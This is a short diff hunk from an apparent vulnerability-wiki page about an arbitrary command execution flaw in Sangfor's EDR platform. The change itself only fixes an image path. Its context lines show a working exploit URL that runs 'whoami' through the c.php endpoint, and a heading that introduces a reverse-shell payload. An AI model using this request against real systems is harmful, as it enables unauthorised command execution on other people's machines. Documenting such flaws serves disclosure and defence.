@@ -26,7 +26,7 @@
 
     https://www.0-sec.org/tool/log/c.php?strip_slashes=system&row=whoami
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(一)/media/rId25.png)
+![1.png](./.resource/深信服终端检测相应平台(EDR)任意命令执行漏洞(一)/media/rId25.png)
 
 ### 反弹shell payload
 
